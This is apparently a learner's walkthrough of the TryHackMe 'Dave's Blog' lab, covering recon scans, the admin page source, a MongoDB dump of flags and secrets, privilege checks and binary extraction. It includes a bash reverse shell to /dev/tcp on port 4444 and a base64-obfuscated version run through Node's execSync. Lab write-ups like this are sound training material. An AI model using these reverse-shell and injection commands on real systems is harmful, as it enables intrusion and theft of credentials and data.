<h1 align="center">Dave´s Blog</h1>
<p align="center">2025, August 16<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>467</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>My friend Dave made his own blog!</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/9554f5a6-ef1d-4ce2-8ea4-beb861619ebe"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/davesblog">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/9e2c0aa1-cf03-410c-beac-94f4d00e155c"></p>

<br>
<br>

```bash
:~/DavesBlog# nikto -h xx.xxx.xx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    ip-xx.xxx.xx.xxx.ec2.internal
+ Target Port:        80
+ Start Time:         2025-08-16 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/22e 0x8R1oIqXXVVXgZl/aE2f24LJICp0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self'
+ Allowed HTTP Methods: GET, HEAD 
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-08-16 xx:xx:xx (GMT1) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


<br>
<br>


```bash
:~/DavesBlog# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open   http         nginx 1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Dave's Blog
3000/tcp open   http         Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
8989/tcp closed sunwebadmins
```

<br>

```bash
:~/DavesBlog# dirsearch -u http://xx.xxx.xxx.xxx -t 100 -i 200,301
...
[xx:xx:xx] Starting: 
[xx:xx:xx] 200 -    1KB - /ADMIN
[xx:xx:xx] 200 -    1KB - /Admin
[xx:xx:xx] 200 -    1KB - /admin
[xx:xx:xx] 200 -    1KB - /Admin/
[xx:xx:xx] 200 -    1KB - /admin/
[xx:xx:xx] 301 -  179B  - /images  ->  /images/
[xx:xx:xx] 200 -   31B  - /robots.txt
```

<br>


```bash
:~/DavesBlog# curl http://xx.xxx.xx.xxx/robots.txt
User-Agent: *
Disallow: /admin
```

<br>

```bash
:~/DavesBlog# curl http://xx.xxx.xx.xxx/admin
<!DOCTYPE html>
<html>

<head>
  <title>Login | Dave's Blog</title>
  <link rel='stylesheet' href='/stylesheets/style.css' />
</head>

<body>
  <h1>Login</h1>

  <form method="POST">
    <input type="text" name="username" placeholder="username" /> <br />
    <input type="password" name="password" placeholder="password" /> <br />
    <input type="submit" value="Log in" />
  </form>

  Don't have an account? Click <a href="/admin/register">here</a> to register!

  <script>
    if(document.location.hash) {
      const div = document.createElement('div')
      div.innerText = decodeURIComponent(document.location.hash.substr(1));
      div.className = 'note';
      document.body.insertBefore(div, document.body.firstChild);
    }
    document.querySelector('form').onsubmit = (e) => {
      /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
    }
  </script>
</body>

</html>
```

<br>

<img width="1130" height="401" alt="image" src="https://github.com/user-attachments/assets/447b63e9-e4a2-4608-a9e9-f6cfff230f5b" />

<br>

<img width="1112" height="265" alt="image" src="https://github.com/user-attachments/assets/0bbb3e1d-cbf3-4557-8ada-3976ddc536c0" />

<br>

<img width="1130" height="365" alt="image" src="https://github.com/user-attachments/assets/463f7a41-f106-4a08-976d-747938da55a2" />

<br>

<img width="1122" height="571" alt="image" src="https://github.com/user-attachments/assets/42beb6ff-96e5-45c1-b3ce-dcd77f53bce0" />

<br>

<img width="1218" height="336" alt="image" src="https://github.com/user-attachments/assets/3b7810c9-b00c-4f78-bcd5-d10a65a3d5bf" />

<br>

<img width="1212" height="391" alt="image" src="https://github.com/user-attachments/assets/ce7b90e0-dfb8-40df-9e47-469a7428b6e5" />


<br>

<img width="1125" height="434" alt="image" src="https://github.com/user-attachments/assets/ba0872ba-75a4-432f-8058-3c707e0daf4d" />

<br>

<img width="1217" height="485" alt="image" src="https://github.com/user-attachments/assets/4b89d70d-313f-4a15-9a4a-c8f2b9b7089b" />

<br>
<br>

<img width="1215" height="496" alt="image" src="https://github.com/user-attachments/assets/61ff8e7a-f5c9-4bbb-9919-b801e90b82ed" />

<br>

<img width="1217" height="491" alt="image" src="https://github.com/user-attachments/assets/4b7c1b03-4198-460e-8b04-9bfb0e86cd0b" />

<br>

<img width="1119" height="459" alt="image" src="https://github.com/user-attachments/assets/69b8820a-c804-4195-8e41-12cc1c5f229a" />

<br>

<img width="814" height="254" alt="image" src="https://github.com/user-attachments/assets/20a1f7e2-74c5-47d3-857e-67a3af4c1ff3" />

<br>

<img width="1108" height="482" alt="image" src="https://github.com/user-attachments/assets/856c5ead-6b27-4b44-8dd6-062a3e8348fe" />

<br>

```bash
bash -i >& /dev/tcp/xx.xxx.xx.x/4444 0>&1
```
<br>

```bash
YmFzaCAtaSA+JiA************xMC4yMDEuMjMuNS80NDQ0IDA+JjE=
```
<br>

```bash
require('child_process').execSync('echo YmFzaCAtaSA+JiA************xMC4yMDEuMjMuNS80NDQ0IDA+JjE= | base64 -d | bash').toString();
```
<br>
<br>

<img width="1200" height="674" alt="image" src="https://github.com/user-attachments/assets/77b68af1-5cd9-4083-a097-1be4ad8b5156" />


<br>
<br>

```bash
:~/DavesBlog# nc -nlvp 4444
...
dave@daves-blog:~/blog$ ls -la /home/dave
ls -la /home/dave
total 44
drwxr-xr-x  5 dave dave 4096 May 22  2020 .
drwxr-xr-x  3 root root 4096 May 21  2020 ..
lrwxrwxrwx  1 dave dave    9 May 21  2020 .bash_history -> /dev/null
-rw-r--r--  1 dave dave  220 May 21  2020 .bash_logout
-rw-r--r--  1 dave dave 3771 May 21  2020 .bashrc
drwxr-xr-x  9 dave dave 4096 Aug 16 03:08 blog
drwxrwxr-x  3 dave dave 4096 May 21  2020 .local
drwxrwxr-x 94 dave dave 4096 May 21  2020 .npm
-rw-r--r--  1 dave dave  807 May 21  2020 .profile
-rw-rw-r--  1 dave dave   66 May 21  2020 .selected_editor
-rwxr-xr-x  1 root root  137 May 22  2020 startup.sh
-rw-rw-r--  1 dave dave   38 May 21  2020 user.txt
dave@daves-blog:~/blog$ cat user.txt
cat user.txt
cat: user.txt: No such file or directory
dave@daves-blog:~/blog$ cat /home/dave/user.txt
cat /home/dave/user.txt
THM{************5367fdcfa4741bebb88a}
```

<br>
<br>
<h3>/uid_checker</h3>

```bash
dave@daves-blog:~$ cat startup.sh
cat startup.sh
# tcpserver -t 50 -RHl0 0.0.0.0 8989 /uid_checker &
rm ~/blog/settings.json;
while :; do cd ~/blog/; npm i; node bin/www; sleep 5; done;
```

<br>

```bash
dave@daves-blog:~/blog$ ls -lah
ls -lah
total 76K
drwxr-xr-x  9 dave dave 4.0K Aug 16 03:08 .
drwxr-xr-x  5 dave dave 4.0K May 22  2020 ..
-rw-r--r--  1 dave dave 1.3K May 21  2020 app.js
drwxr-xr-x  2 dave dave 4.0K May 21  2020 bin
drwxr-xr-x  2 dave dave 4.0K May 21  2020 helpers
drwxr-xr-x  2 dave dave 4.0K May 21  2020 models
drwxrwxr-x 93 dave dave 4.0K Aug 16 03:08 node_modules
-rw-r--r--  1 dave dave  347 May 21  2020 package.json
drwxr-xr-x  5 dave dave 4.0K May 21  2020 public
drwxr-xr-x  2 dave dave 4.0K May 22  2020 routes
-rw-rw-r--  1 dave dave   46 Aug 16 03:08 settings.json
drwxr-xr-x  2 dave dave 4.0K May 21  2020 views
-rw-r--r--  1 dave dave  27K May 21  2020 yarn.lock
```

<br>
<br>
<h3>settings.json</h3>

```bash
dave@daves-blog:~/blog$ cat settings.json
cat settings.json
{
  "jwtToken": "0.*****e7d3ar0.6mlyymbg0e9"
}
```

<br>
<br>
<h3>app.js</h3>
<p>
  
- mongodb://localhost:27017/daves-blog</p>

```bash
dave@daves-blog:~/blog$ cat app.js
cat app.js
var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
const mongoose = require('mongoose');

var indexRouter = require('./routes/index');
var adminRouter = require('./routes/admin');

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

mongoose.connect('mongodb://localhost:27017/daves-blog', {
  useNewUrlParser: true
});

console.log(require('./helpers/getJwtSecret')())

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);
app.use('/admin', adminRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
```

<br>


```bash
dave@daves-blog:~/blog$ mongo
mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
...
> show databases
shshow databases
admin       0.000GB
config      0.000GB
daves-blog  0.000GB
local       0.000GB
> use daves-blog
ususe daves-blog
switched to db daves-blog
> show tables;
shshow tables;
posts
users
whatcouldthisbes
> db.users.find()
dbdb.users.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864107"), "isAdmin" : true, "username" : "dave", "password" : "THM{***********************}", "__v" : 0 }
> db.whatcouldthisbes.find()
dbdb.whatcouldthisbes.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"), "whatCouldThisBe" : "THM{********************************}", "__v" : 0 }
```

<br>

```bash
> db.whatcouldthisbes.find().pretty()
dbdb.whatcouldthisbes.find().pretty()
{
	"_id" : ObjectId("5ec6e5cf1dc4d364bf864108"),
	"whatCouldThisBe" : "THM{********************************}",
	"__v" : 0
}
```


<br>
<br>
<h3>Dave´s Privileges</h3>

```bash
dave@daves-blog:~/blog$ sudo -l
sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
```

<br>

```bash
dave@daves-blog:/$ ls -lah
ls -lah
total 2.0G
drwxr-xr-x  24 root root 4.0K May 21  2020 .
drwxr-xr-x  24 root root 4.0K May 21  2020 ..
drwxr-xr-x   2 root root 4.0K May 21  2020 bin
drwxr-xr-x   3 root root 4.0K May 21  2020 boot
drwxr-xr-x   2 root root 4.0K May 21  2020 cdrom
drwxr-xr-x  15 root root 3.7K Aug 16 03:08 dev
drwxr-xr-x  96 root root 4.0K May 23  2020 etc
drwxr-xr-x   3 root root 4.0K May 21  2020 home
lrwxrwxrwx   1 root root   34 May 21  2020 initrd.img -> boot/initrd.img-4.15.0-101-generic
lrwxrwxrwx   1 root root   34 May 21  2020 initrd.img.old -> boot/initrd.img-4.15.0-101-generic
drwxr-xr-x  22 root root 4.0K May 21  2020 lib
drwxr-xr-x   2 root root 4.0K Aug  5  2019 lib64
drwx------   2 root root  16K May 21  2020 lost+found
drwxr-xr-x   2 root root 4.0K Aug  5  2019 media
drwxr-xr-x   2 root root 4.0K Aug  5  2019 mnt
drwxr-xr-x   2 root root 4.0K Aug  5  2019 opt
dr-xr-xr-x 109 root root    0 Aug 16 03:08 proc
drwx------   6 root root 4.0K May 22  2020 root
drwxr-xr-x  26 root root  900 Aug 16 03:09 run
drwxr-xr-x   2 root root  12K May 21  2020 sbin
drwxr-xr-x   4 root root 4.0K May 21  2020 snap
drwxr-xr-x   2 root root 4.0K Aug  5  2019 srv
-rw-------   1 root root 2.0G May 21  2020 swap.img
dr-xr-xr-x  13 root root    0 Aug 16 04:31 sys
drwxrwxrwt   9 root root 4.0K Aug 16 03:09 tmp
-rwxr-xr-x   1 root root 8.4K May 21  2020 uid_checker
drwxr-xr-x  10 root root 4.0K Aug  5  2019 usr
drwxr-xr-x  14 root root 4.0K May 21  2020 var
lrwxrwxrwx   1 root root   31 May 21  2020 vmlinuz -> boot/vmlinuz-4.15.0-101-generic
lrwxrwxrwx   1 root root   31 May 21  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-101-generic
```

<br>
<br>
<h3>uid_checker´s strings</h3>


```bash
dave@daves-blog:/$ strings uid_checker
...
How did you get here???
/bin/sh
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
Your UID is: %d
Your GID is: %d
THM{*******************************}
Wow! You found the secret function! I still need to finish it..
Invalid choice
```

<img width="1200" height="522" alt="image" src="https://github.com/user-attachments/assets/620ff899-be0a-4e01-abee-49829a836b10" />

<br>

```bash
dave@daves-blog:/$ ./uid_checker  
./uid_checker
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
1
1
Your UID is: 1000
dave@daves-blog:/$ ./uid_checker
./uid_checker
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
2
2
Your GID is: 1000
dave@daves-blog:/$ 
```

<br>
<br>
<br>

```bash
:~/DavesBlog# nano import.py
```

<br>

```bash
:~/DavesBlog# cat import.py
from pwn import *

target_ip = "10.201.13.209"
port = 4444

print(f"[+] Connecting to {target_ip}:{port}...")
conn = remote(target_ip, port)

binary_data = conn.recvall()
conn.close()
print("[+] Binary received. Saving to disk...")

with open("uid_checker", "wb") as f:
    f.write(binary_data)

print("[+] File saved as 'uid_checker'.")
```

<br>

```bash
# sender.py
from pwn import *

binary_path = "/uid_checker"
port = 9001

with open(binary_path, "rb") as f:
    binary_data = f.read()

server = listen(port)
print(f"[+] Listening on port {port}...")

conn = server.wait_for_connection()
conn.send(binary_data)
conn.close()
print("[+] Binary sent.")
```


:~/DavesBlog# nc -nlvp 9001
Listening on 0.0.0.0 9001


<br>
<br>


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 16   |   467    |     120ᵗʰ    |      5ᵗʰ     |     314ᵗʰ   |     6ᵗʰ    | 121,606  |    919    |    73     |


</div>
